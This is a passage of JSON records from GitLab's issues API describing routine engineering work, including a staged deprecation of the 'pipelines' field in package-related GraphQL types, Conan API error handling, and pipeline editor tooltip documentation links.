ci_find_runners_by_ci_mirrors false\n```","state":"closed","created_at":"2021-12-06T13:52:45.651Z","updated_at":"2022-02-17T10:13:46.574Z","closed_at":"2022-02-17T10:13:46.552Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Engineering Allocation","[Deprecated] Category:Runner","backend","ci-decomposition","devops::verify","feature flag","feature::addition","group::runner","section::ops","type::feature","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347226","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":8},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347226","notes":"https://gitlab.com/api/v4/projects/278964/issues/347226/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347226/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347226","relative":"#347226","full":"gitlab-org/gitlab#347226"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6379,"epic":{"id":309971,"iid":6379,"title":"Decomposition: Make Ops features compatible with Decomposed CI database","url":"/groups/gitlab-org/-/epics/6379","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98526029,"iid":347224,"project_id":278964,"title":"Remove pipelines fields as deprecated in the package related GraphQL types","description":"Remove the `pipelines` field from the following ~GraphQL types:\n\n* `app/graphql/types/packages/package_type.rb`\n* `app/graphql/types/packages/package_details_type.rb`\n\nThis is step 6 of:\n\n1. Mark `pipelines` fields as deprecated in the package related ~GraphQL types.\n1. Add `build_infos` field to package related ~GraphQL types.\n1. Add a new ~GraphQL query to get Pipeline data given a global id.\n1. Announce the removals in the release post.\n1. Update the ~frontend to use (2.) and (3.) and stop reading the `pipelines` field.\n1. :point_right: Remove the `pipelines` fields from the package related ~GraphQL types.","state":"closed","created_at":"2021-12-06T13:44:49.192Z","updated_at":"2022-04-13T08:29:01.623Z","closed_at":"2022-04-12T08:07:08.965Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","GraphQL","[deprecated] Accepting merge requests","auto updated","backend","devops::package","group::package registry","ruby","section::ops"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":null,"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347224","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347224","notes":"https://gitlab.com/api/v4/projects/278964/issues/347224/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347224/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347224","relative":"#347224","full":"gitlab-org/gitlab#347224"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7214,"epic":{"id":400180,"iid":7214,"title":"GraphQL: remove pipelines fields from package related types","url":"/groups/gitlab-org/-/epics/7214","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98525900,"iid":347223,"project_id":278964,"title":"Package list and details pages: use the build_infos field and get the pipelines through that.","description":"In the:\n* Package list page\n* Package details page\n\nUse the field `build_infos` to access the `pipeline` objects. Apply pagination parameters on the `build_infos` field.\n\nBonus: remove the Pipeline data fetching from the initial load and use a loader.\n\nThis is step 5 of:\n\n1. Mark `pipelines` fields as deprecated in the package related ~GraphQL types.\n1. Add `build_infos` field to package related ~GraphQL types.\n1. Add a new ~GraphQL query to get Pipeline data given a global id.\n1. Announce the removals in the release post.\n1. :point_right: Update the ~frontend to use (2.) and (3.) and stop reading the `pipelines` field.\n1. Remove the `pipelines` fields from the package related ~GraphQL types.","state":"closed","created_at":"2021-12-06T13:43:19.530Z","updated_at":"2022-07-01T15:59:41.353Z","closed_at":"2022-04-12T08:07:48.873Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","GraphQL","Package:P1","UX","[deprecated] Accepting merge requests","auto updated","devops::package","frontend","group::package registry","ruby","section::ops","workflow::ready for development"],"milestone":null,"assignees":[],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":null,"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347223","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347223","notes":"https://gitlab.com/api/v4/projects/278964/issues/347223/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347223/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347223","relative":"#347223","full":"gitlab-org/gitlab#347223"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7214,"epic":{"id":400180,"iid":7214,"title":"GraphQL: remove pipelines fields from package related types","url":"/groups/gitlab-org/-/epics/7214","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98525729,"iid":347222,"project_id":278964,"title":"Announce the pipelines field removal from package related graphql types","description":"Announce the pipelines field removal from package related graphql types in the release post\n\nThis is step 4 of:\n\n1. Mark `pipelines` fields as deprecated in the package related ~GraphQL types.\n1. Add `build_infos` field to package related ~GraphQL types.\n1. Add a new ~GraphQL query to get Pipeline data given a global id.\n1. :point_right: Announce the removals in the release post.\n1. Update the ~frontend to use (2.) and (3.) and stop reading the `pipelines` field.\n1. Remove the `pipelines` fields from the package related ~GraphQL types.","state":"closed","created_at":"2021-12-06T13:40:01.050Z","updated_at":"2022-04-12T08:07:58.579Z","closed_at":"2022-04-12T08:07:58.529Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","[deprecated] Accepting merge requests","auto updated","devops::package","group::package registry","section::ops"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":null,"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347222","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347222","notes":"https://gitlab.com/api/v4/projects/278964/issues/347222/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347222/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347222","relative":"#347222","full":"gitlab-org/gitlab#347222"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7214,"epic":{"id":400180,"iid":7214,"title":"GraphQL: remove pipelines fields from package related types","url":"/groups/gitlab-org/-/epics/7214","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98525660,"iid":347221,"project_id":278964,"title":"Add a GraphQL query to get a pipeline from its globalID","description":"Introduce a new ~GraphQL query that returns a single:\n\n* `app/graphql/types/ci/pipeline_type.rb`\n\ngiven its global id.\n\nThis is step 3 of:\n\n1. Mark `pipelines` fields as deprecated in the package related ~GraphQL types.\n1. Add `build_infos` field to package related ~GraphQL types.\n1. :point_right: Add a new ~GraphQL query to get Pipeline data given a global id.\n1. Announce the removals in the release post.\n1. Update the ~frontend to use (2.) and (3.) and stop reading the `pipelines` field.\n1. Remove the `pipelines` fields from the package related ~GraphQL types.","state":"closed","created_at":"2021-12-06T13:38:26.443Z","updated_at":"2022-06-30T11:25:23.266Z","closed_at":"2022-03-07T23:21:16.281Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Package Registry","GraphQL","Package:P2","Stretch","[deprecated] Accepting merge requests","auto updated","backend","devops::package","group::package registry","needs investigation","ruby","section::ops"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":null,"user_notes_count":4,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347221","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347221","notes":"https://gitlab.com/api/v4/projects/278964/issues/347221/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347221/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347221","relative":"#347221","full":"gitlab-org/gitlab#347221"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7214,"epic":{"id":400180,"iid":7214,"title":"GraphQL: remove pipelines fields from package related types","url":"/groups/gitlab-org/-/epics/7214","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98525465,"iid":347220,"project_id":278964,"title":"Improve the performance of the pipelines field in the package related GraphQL types","description":"* Use a single resolver for the `pipelines` field, no matter how the package related pipelines are accessed (by a single package, by a project or by a group).\n* Support pagination parameters.\n* Remove the existing `n+1` situations.\n* Deploy this change using a ~\"feature flag\".","state":"closed","created_at":"2021-12-06T13:35:51.620Z","updated_at":"2022-06-30T11:25:43.788Z","closed_at":"2022-05-12T18:35:46.905Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","Deliverable","GraphQL","Package:P1","auto updated","backend","devops::package","group::package registry","package:active","ruby","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":68,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347220","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347220","notes":"https://gitlab.com/api/v4/projects/278964/issues/347220/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347220/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347220","relative":"#347220","full":"gitlab-org/gitlab#347220"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":98525117,"iid":347219,"project_id":278964,"title":"Mark pipelines fields as deprecated in the package related GraphQL types","description":"Follow https://docs.gitlab.com/ee/development/api_graphql_styleguide.html#deprecating-fields-arguments-and-enum-values to deprecate the `pipelines` field in those types:\n\n* `app/graphql/types/packages/package_type.rb`\n* `app/graphql/types/packages/package_details_type.rb`\n\nThis is step 1 of:\n1. :point_right: Mark `pipelines` fields as deprecated in the package related ~GraphQL types.\n1. Add `build_infos` field to package related ~GraphQL types.\n1. Add a new ~GraphQL query to get Pipeline data given a global id.\n1. Announce the removals in the release post.\n1. Update the ~frontend to use (2.) and (3.) and stop reading the `pipelines` field.\n1. Remove the `pipelines` fields from the package related ~GraphQL types.","state":"closed","created_at":"2021-12-06T13:28:58.003Z","updated_at":"2022-04-19T19:13:01.867Z","closed_at":"2021-12-14T09:26:38.513Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","GraphQL","auto updated","backend","devops::package","group::package registry","package:active","ruby","section::ops","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347219","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347219","notes":"https://gitlab.com/api/v4/projects/278964/issues/347219/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347219/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347219","relative":"#347219","full":"gitlab-org/gitlab#347219"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7214,"epic":{"id":400180,"iid":7214,"title":"GraphQL: remove pipelines fields from package related types","url":"/groups/gitlab-org/-/epics/7214","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98523310,"iid":347217,"project_id":278964,"title":"Conan packages: map validation errors to 400 Bad Request responses","description":"## :fire: Problem\n\nIn the ~\"Conan Repository\" packages API, validation errors can occurs.\n\nFor example, we could have a race condition on finding or create the package = one of the concurrent access will fail this [validation](https://gitlab.com/gitlab-org/gitlab/-/blob/f838263173adbca8ef04bd91f9a196c9e62f8171/app/models/packages/package.rb#L312-322).\n\n\n![Screenshot_2021-12-06_at_14.03.39](/uploads/8f006a2cbe8e7e9009c47e912a0ebe5b/Screenshot_2021-12-06_at_14.03.39.png)\n![Screenshot_2021-12-06_at_14.03.45](/uploads/638deca1b60e6604439eaf6e6e8e2d17/Screenshot_2021-12-06_at_14.03.45.png)\n\nThe problem is that this validation error is currently mapped to a `500 Server error` response. This is not accurate as it is an expected error (that can happen). In addition, this contributes negatively to the Package Team error budget.\n\n\n\n## :fire_engine: Solution\n\nThe validation errors should be mapped to a `400 Bad Request` response as it is a controlled error.","state":"closed","created_at":"2021-12-06T13:04:49.987Z","updated_at":"2022-02-24T09:15:33.678Z","closed_at":"2022-02-24T09:00:07.985Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","Community contribution","Conan Repository","backend","devops::package","good for new contributors","group::package registry","ruby","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":662040,"username":"batu","name":"Batuhan Wilhelm","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/662040/avatar.png","web_url":"https://gitlab.com/batu"}],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":{"id":662040,"username":"batu","name":"Batuhan Wilhelm","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/662040/avatar.png","web_url":"https://gitlab.com/batu"},"user_notes_count":3,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347217","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347217","notes":"https://gitlab.com/api/v4/projects/278964/issues/347217/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347217/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347217","relative":"#347217","full":"gitlab-org/gitlab#347217"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98517891,"iid":347212,"project_id":278964,"title":"Frontend: Add docs links to the keyword tooltips in the pipeline editor","description":"\u003c!-- The first section \"Release notes\" is required if you want to have your release post blog MR auto generated. Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\nThe Pipeline editor is our one-stop-shop for GitLab CI. In order to improve the authoring experience for new and novice users we would like to support them as they write or update their CI pipeline.\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem\n\nGitLab CI could be intimidating to technical and non-technical users. In order to work with GitLab CI users need to be familiar with YAML which is error-prone. In addition, GitLab CI is highly flexible but with this flexibility comes a level of complexity, there are many keywords and ways to implement Pipelines, and it's difficult to understand and remember the properties of different keywords.\n\nThe auto-complete functionality by itself is not enough, users would need to understand what each keyword is doing and should be able to quickly navigate into the relevant docs section.\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n\n#### User stories\n\nWhen writing a pipeline configuration and using different templates and examples I want to easily learn what different keywords do and how to use them.\n\n## Proposal\n\nAdd docs links to all keywords in the CI Schema so they show up in the on-hover tooltips in the pipeline editor.\n\n| |  |\n| ------ | ------ |\n| ![image](/uploads/f108d2901de5d40efe990794eba78f5c/image.png) | ![image](/uploads/0332a1356eafcdcade53e98bb4d98add/image.png) |\n\nThe \"Learn more\" link should open the appropriate section in the [keyword reference documentation. ](https://docs.gitlab.com/ee/ci/yaml/)\n\n#### :link: [Figma design specs](https://www.figma.com/file/O1iQx5kEr3UK1cTYu1qFnH/%F0%9F%92%9CPipeline-Editor?node-id=1811%3A53862)\n\n### Metrics \n\n\u003c!-- How are you going to track uage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n### Permissions and Security\n\nAccessible to all users who have access to the pipeline editor.\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### Available Tier\n\n\u003c!-- This section should be used for setting the appropriate tier that this feature will belong to. Pricing can be found here: https://about.gitlab.com/pricing/\n\n* Premium/Silver\n* Ultimate/Gold\n--\u003e\n\n* Free","state":"closed","created_at":"2021-12-06T11:21:59.544Z","updated_at":"2022-06-01T15:46:15.412Z","closed_at":"2022-06-01T15:46:15.392Z","closed_by":{"id":5327378,"username":"f_caplette","name":"Frdric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"labels":["Category:Pipeline Authoring","Low SUS Score","SUS::Non-impacting","UX","auto updated","candidate::15.2","devops::verify","feature::addition","frontend","group::pipeline authoring","learnability","onboarding","section::ops","severity::4","type::feature","usability","workflow::production"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[{"id":10159828,"username":"shridharbhat1998","name":"Shreedhar Bhat","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10159828/avatar.png","web_url":"https://gitlab.com/shridharbhat1998"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":10159828,"username":"shridharbhat1998","name":"Shreedhar Bhat","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10159828/avatar.png","web_url":"https://gitlab.com/shridharbhat1998"},"user_notes_count":23,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347212","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items 